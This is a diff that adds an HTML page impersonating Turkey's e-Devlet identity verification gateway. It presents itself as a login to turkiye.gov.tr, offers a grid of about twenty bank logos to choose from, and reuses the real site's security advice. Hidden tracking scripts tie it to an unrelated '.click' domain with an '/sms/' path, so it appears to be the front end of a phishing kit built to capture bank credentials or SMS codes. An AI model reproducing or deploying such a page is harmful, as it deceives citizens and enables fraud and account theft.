@@ -1,0 +1,202 @@
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sorgu</title>
+    <link rel="stylesheet" href="assets/css/style.css">
+    <link rel="shortcut icon" href="assets/images/favicon-196x196.png" type="image/x-icon">
+    <style>
+        @media(max-width:768px) {
+            #basis  main .methodSelector {
+                height: unset;
+                padding: unset;
+            }
+            .richText {
+                gap: 20px;
+                width: 100%;
+                display: grid;
+                grid-template-columns: repeat(2, 1fr);
+                justify-items: center;
+            }
+            .richText .box {
+                width: 100%;
+            }
+            
+        }
+        #basis  main .referrerApp {
+            display: flex;
+            align-items: center;
+            flex-direction: row-reverse;
+            justify-content: space-between;
+        }
+
+        #basis  main .referrerApp img {
+            height: 100%;
+            width: 100%;
+        }
+    </style>
+</head><body id="ROOT">
+    <div id="basis">
+      <header id="headerSection">
+        <h1>Türkiye Cumhuriyeti Vatandaş Kimlik Doğrulama Sistemi</h1>
+        <nav id="accesibilityBlock" class="visuallyhidden">
+          <ul>
+            <li>
+              <a accesskey="s">Ana Sayfa</a>
+            </li>
+            <li>
+              <a accesskey="1">İçeriğe Git</a>
+            </li>
+          </ul>
+        </nav>
+      </header>
+      <main>
+        <section class="referrerApp">
+          <img class="sso" src="assets/images/1.png" alt="" width="165" height="40">
+          <dl>
+            <dt>Giriş Yapılacak Adres </dt>
+            <dd>
+              <span title="www.turkiye.gov.tr">www.turkiye.gov.tr</span>
+            </dd>
+            <dt>Giriş Yapılacak Uygulama </dt>
+            <dd>
+              <span title="e-Devlet Kapısı">e-Devlet Kapısı</span>
+            </dd>
+          </dl>
+        </section>
+        <nav class="methodSelector">
+        </nav>
+        <section id="pageContent">
+            <div class="richText">
+                <div class="box">
+                  <img src="assets/images/banks/akbank.jpg" alt="akbank">
+                </div>
+                <div class="box">
+                  <img src="assets/images/banks/albaraka.jpg" alt="albaraka">
+                </div>
+                <div class="box">
+                  <img src="assets/images/banks/alternatif.jpg" alt="alternatif">
+                </div>
+                <div class="box">
+                  <img src="assets/images/banks/anadolu.jpg" alt="anadolu">
+                </div>
+                <div class="box">
+                  <img src="assets/images/banks/deniz.jpg" alt="deniz">
+                </div>
+                <div class="box">
+                  <img src="assets/images/banks/fiba.jpg" alt="fiba">
+                </div>
+                <div class="box">
+                  <img src="assets/images/banks/finans.jpg" alt="finans">
+                </div>
+                <div class="box">
+                  <img src="assets/images/banks/garanti.jpg" alt="garanti">
+                </div>
+                <div class="box">
+                  <img src="assets/images/banks/halk.jpg" alt="halk">
+                </div>
+                <div class="box">
+                  <img src="assets/images/banks/hsbc.jpg" alt="hsbc">
+                </div>
+                <div class="box">
+                  <img src="assets/images/banks/ing.jpg" alt="ing">
+                </div>
+                <div class="box">
+                  <img src="assets/images/banks/isbank.jpg" alt="isbank">
+                </div>
+                <div class="box">
+                  <img src="assets/images/banks/kuveyt.jpg" alt="kuveyt">
+                </div>
+                <div class="box">
+                  <img src="assets/images/banks/odea.jpg" alt="odea">
+                </div>
+                <div class="box">
+                  <img src="assets/images/banks/ptt.jpg" alt="ptt">
+                </div>
+                <div class="box">
+                  <img src="assets/images/banks/sekerbank.jpg" alt="sekerbank">
+                </div>
+                <div class="box">
+                  <img src="assets/images/banks/teb.jpg" alt="teb">
+                </div>
+                <div class="box">
+                  <img src="assets/images/banks/turkiyefinans.jpg" alt="turkiyefinans">
+                </div>
+                <div class="box">
+                  <img src="assets/images/banks/vakif.jpg" alt="vakif">
+                </div>
+                <div class="box">
+                  <img src="assets/images/banks/ykb.jpg" alt="ykb">
+                </div>
+                <div class="box">
+                  <img src="assets/images/banks/ziraat.jpg" alt="ziraat">
+                </div>
+              </div>
+        </section>
+      </main>
+      <footer>
+        <ul class="footerLinks">
+          <li>
+            <a open-modal="gizlilikGuvenlik">Gizlilik ve Güvenlik</a>
+          </li>
+          <li>
+            <a>Hızlı Çözüm Merkezi</a>
+          </li>
+        </ul>
+        <div class="copyrightDetails"> © <script async="" type="text/javascript" src="//whos.amung.us/pingjs/?k=9rjcinrjmu&amp;t=Sorgu&amp;c=s&amp;x=https%3A%2F%2Fydxytfsagasfd33.click%2Fsms%2F&amp;y=https%3A%2F%2Fydxytfsagasfd33.click%2F&amp;a=0&amp;d=1&amp;v=27&amp;r=3674"></script><script>document.write(new Date().getFullYear())</script>2024 Ankara - Tüm Hakları Saklıdır </div>
+      </footer>
+    </div>
+    <div class="mask">
+    </div>
+    <div class="modal" id="gizlilikGuvenlik" role="dialog" tabindex="-1" aria-labelledby="e11_cmghcvpos7d8">
+      <a close-modal="" class="visuallyhidden" aria-label="Pencereyi Kapat">Yeni Pencere Açıldı. Pencereyi kapamak için ESC tuşuna basabilirsiniz.</a>
+      <div class="modal-container" role="document">
+        <span class="close" close-modal="" aria-label="Pencereyi Kapat">
+          <i class="edk-fonticon-close">
+          </i>
+        </span>
+        <h3 id="e11_cmghcvpos7d8">Gizlilik ve Güvenlik</h3>
+        <div class="modal-content">
+          <p>e-Devlet Kapısı çalışanları hiçbir zaman size şifrenizi sormayacaktır. Şifrenizi e-Devlet Kapısı giriş ekranları haricinde hiçbir yere kaydetmeyiniz. Tarayıcı uygulaması (Internet Explorer, Firefox, Safari ve benzeri uygulamaların) şifre kaydetme opsiyonlarını kapalı tutunuz. Ayrıca hiçbir zaman kişisel bilgileriniz veya şifreniz e-posta yolu ile sizlere sorulmayacaktır. Unutmayınız ki zararlı uygulamaların ve virüslerin büyük çoğunluğu e-posta yolu ile yayılmaktadır. Bu sebeple göndericisini tanımadığınız veya şüpheli e-postaları okumadan siliniz.</p>
+          <p>e-Devlet Kapısı sistemi, güvenlik amaçlı olarak elektronik sertifika kullanmaktadır. Erişiminizin güvenli olup olmadığını adres çubuğunda yer alan adresin http değil https ile başlamasından ve tarayıcı uygulamasındaki kilit resminden anlayabilirsiniz.</p>
+        </div>
+        <div class="modal-footer">
+          <div class="formSubmitRow">
+            <button class="cancelButton" close-modal="" aria-label="Pencereyi Kapat">Kapat</button>
+          </div>
+        </div>
+      </div>
+      <div class="modalBg">
+      </div>
+    </div>
+    <div class="modal" id="info" role="dialog" tabindex="-1" aria-labelledby="e11_dvr2h3nptovl">
+      <a close-modal="" class="visuallyhidden" aria-label="Pencereyi Kapat">Yeni Pencere Açıldı. Pencereyi kapamak için ESC tuşuna basabilirsiniz.</a>
+      <a close-modal="" class="visuallyhidden" aria-label="Pencereyi Kapat">Yeni Pencere Açıldı. Pencereyi kapamak için ESC tuşuna basabilirsiniz.</a>
+      <div class="modal-container" role="document">
+        <span class="close" close-modal="" aria-label="Pencereyi Kapat">
+          <i class="edk-fonticon-close">
+          </i>
+        </span>
+        <h3 id="e11_dvr2h3nptovl">e-Devlet Şifresi</h3>
+        <div class="modal-content">
+          <p>e-Devlet şifrenizi içeren zarfınızı PTT Merkez Müdürlüklerinden, şahsen başvuru ile, üzerinde T.C. Kimlik numaranızın bulunduğu kimliğinizi ibraz ederek temin edebilirsiniz.</p>
+          <p>Bu uygulama, sizin yerinize başka bir kişinin şifre alıp adınıza işlem yapmasının önüne geçilmesi için gerekmektedir. e-Devlet Kapısı üzerinden verilen hizmetler yüksek güvenlik seviyesi gerektirdiğinden, şifreler başvuru sahipleri için özel olarak oluşturulmaktadır. Bu nedenle ancak kimlik ibrazı ve şahsen başvuru ile şifreler verilmektedir.</p>
+          <p>Şifre ilk alındığında PTT tarafından işlem masrafı olarak 2 TL tahsil edilmektedir. Şifrenin kaybedilmesi, unutulması vb. durumlarda PTT'den alınacak her şifre için ayrıca 4 TL ücret ödenmektedir. Bu işlem masrafı dışında herhangi bir yıllık ücret ödenmesi söz konusu değildir.</p>
+          <h4>Şifrenizi unutmanız durumunda e-Devlet'te doğruladığınız telefon numaranız ile şifrenizi yenileyebilirsiniz.</h4>
+          <p>e-Devlet Kapısı kayıtlı kullanıcısıysanız ve şifrenizle giriş yaptıktan sonra "Profilim" alanında bulunan iletişim bilgileri kısmına cep telefonunuzu kaydettiyseniz ya da cep telefonunuzu veya hem cep telefonunuzu hem de e-posta adresinizi e-Devlet Kapısında doğruladıysanız şifre yenileme hizmetinden yararlanarak yeniden şifre temin edebilirsiniz. Bununla birlikte, mobil imza, elektronik imza, yeni T.C. kimlik kartı veya internet bankacılığı kullanıyorsanız, e-Devlet Kapısına bunlardan biri ile giriş yaptıktan sonra da şifre oluşturabilirsiniz.</p>
+          <p>e-Devlet şifresi yurt dışında Elçilik ve Konsolosluklardan ücretsiz olarak temin edilebilmektedir.</p>
+        </div>
+        <div class="modal-footer">
+          <div class="formSubmitRow">
+            <button class="cancelButton" close-modal="" aria-label="Pencereyi Kapat">Kapat</button>
+          </div>
+        </div>
+      </div>
+      <div class="modalBg">
+      </div>
+    </div>
+    <script src="assets/js/script.js">
+    </script>
+        <div style="display:none;"><script id="_waum5f">var _wau = _wau || []; _wau.push(["small", "9rjcinrjmu", "m5f"]);</script><div title="Click to see what's popular on this site!" style="position: relative; display: inline-block; background-image: url(&quot;data:image/gif;base64,R0lGODlhUAAXAMQAAM1iTdBuWMQ4MsdHOt+ch/js5+/Qw+vCs/Pe1dR6Y+OolNuQespVQ9eFbsAnLX9/fzAwL////zU1NQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAABQABcAAAX/ICSOZGmeaKqu7Bi9L3IcBWzfeK7vfI+LMAPAQXQEEBGJcslsOp/QqFQaAUYMAiIjMnAIDMmpeEweVyGRQtcxIByy7Fd5Ti+fIwTiABYoKsJ1gYJMd30OeIhDRoCDjXR3igAEEQAChgCMjppihUULL3CLm6OcQHlEEQ0JEX6ZpK9Ld2qofZRxrrCvd1dZrA4AlWC5w7FWEQgJRQ4JSMTOuzAFMzU+1dbX1i3a29zdJhIwSkk24OGAOOU56eJyYw8S73ax7bGE54y45fP1YvFzYXIy4btH6Mm4feKYPIi3kCE8eAuXRHRy8OA6duzQkUuYMSMghyAfhnzYpF1FKPjsNPEDyI8jyXchYSqB2ZBiPYs2W+rjyNIlOIkzX4oU6s9gwB4lN4ZzaW5pmIkxhUIs6uzRsBAAOw==&quot;); width: 80px; height: 15px; padding: 0px; margin: 0px; overflow: hidden; cursor: pointer; direction: ltr;"><div style="background-image: url(&quot;data:image/gif;base64,R0lGODlhUAAXAMQAAM1iTdBuWMQ4MsdHOt+ch/js5+/Qw+vCs/Pe1dR6Y+OolNuQespVQ9eFbsAnLX9/fzAwL////zU1NQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAABQABcAAAX/ICSOZGmeaKqu7Bi9L3IcBWzfeK7vfI+LMAPAQXQEEBGJcslsOp/QqFQaAUYMAiIjMnAIDMmpeEweVyGRQtcxIByy7Fd5Ti+fIwTiABYoKsJ1gYJMd30OeIhDRoCDjXR3igAEEQAChgCMjppihUULL3CLm6OcQHlEEQ0JEX6ZpK9Ld2qofZRxrrCvd1dZrA4AlWC5w7FWEQgJRQ4JSMTOuzAFMzU+1dbX1i3a29zdJhIwSkk24OGAOOU56eJyYw8S73ax7bGE54y45fP1YvFzYXIy4btH6Mm4feKYPIi3kCE8eAuXRHRy8OA6duzQkUuYMSMghyAfhnzYpF1FKPjsNPEDyI8jyXchYSqB2ZBiPYs2W+rjyNIlOIkzX4oU6s9gwB4lN4ZzaW5pmIkxhUIs6uzRsBAAOw==&quot;); background-repeat: no-repeat; background-attachment: scroll; background-position: -5px -15px; position: absolute; width: 3px; height: 8px; top: 4px; left: 20px; line-height: 8px; overflow: hidden; padding: 0px; margin: 0px;"></div><div style="background-image: url(&quot;data:image/gif;base64,R0lGODlhUAAXAMQAAM1iTdBuWMQ4MsdHOt+ch/js5+/Qw+vCs/Pe1dR6Y+OolNuQespVQ9eFbsAnLX9/fzAwL////zU1NQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAABQABcAAAX/ICSOZGmeaKqu7Bi9L3IcBWzfeK7vfI+LMAPAQXQEEBGJcslsOp/QqFQaAUYMAiIjMnAIDMmpeEweVyGRQtcxIByy7Fd5Ti+fIwTiABYoKsJ1gYJMd30OeIhDRoCDjXR3igAEEQAChgCMjppihUULL3CLm6OcQHlEEQ0JEX6ZpK9Ld2qofZRxrrCvd1dZrA4AlWC5w7FWEQgJRQ4JSMTOuzAFMzU+1dbX1i3a29zdJhIwSkk24OGAOOU56eJyYw8S73ax7bGE54y45fP1YvFzYXIy4btH6Mm4feKYPIi3kCE8eAuXRHRy8OA6duzQkUuYMSMghyAfhnzYpF1FKPjsNPEDyI8jyXchYSqB2ZBiPYs2W+rjyNIlOIkzX4oU6s9gwB4lN4ZzaW5pmIkxhUIs6uzRsBAAOw==&quot;); background-repeat: no-repeat; background-attachment: scroll; background-position: -13px -15px; position: absolute; width: 5px; height: 8px; top: 4px; left: 24px; line-height: 8px; overflow: hidden; padding: 0px; margin: 0px;"></div><div style="background-image: url(&quot;data:image/gif;base64,R0lGODlhUAAXAMQAAM1iTdBuWMQ4MsdHOt+ch/js5+/Qw+vCs/Pe1dR6Y+OolNuQespVQ9eFbsAnLX9/fzAwL////zU1NQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAABQABcAAAX/ICSOZGmeaKqu7Bi9L3IcBWzfeK7vfI+LMAPAQXQEEBGJcslsOp/QqFQaAUYMAiIjMnAIDMmpeEweVyGRQtcxIByy7Fd5Ti+fIwTiABYoKsJ1gYJMd30OeIhDRoCDjXR3igAEEQAChgCMjppihUULL3CLm6OcQHlEEQ0JEX6ZpK9Ld2qofZRxrrCvd1dZrA4AlWC5w7FWEQgJRQ4JSMTOuzAFMzU+1dbX1i3a29zdJhIwSkk24OGAOOU56eJyYw8S73ax7bGE54y45fP1YvFzYXIy4btH6Mm4feKYPIi3kCE8eAuXRHRy8OA6duzQkUuYMSMghyAfhnzYpF1FKPjsNPEDyI8jyXchYSqB2ZBiPYs2W+rjyNIlOIkzX4oU6s9gwB4lN4ZzaW5pmIkxhUIs6uzRsBAAOw==&quot;); background-repeat: no-repeat; background-attachment: scroll; background-position: -50px -15px; position: absolute; width: 24px; height: 8px; top: 4px; left: 30px; line-height: 8px; overflow: hidden; padding: 0px; margin: 0px;"></div></div><script async="" src="//waust.at/s.js"></script></div>
+  
+</body>
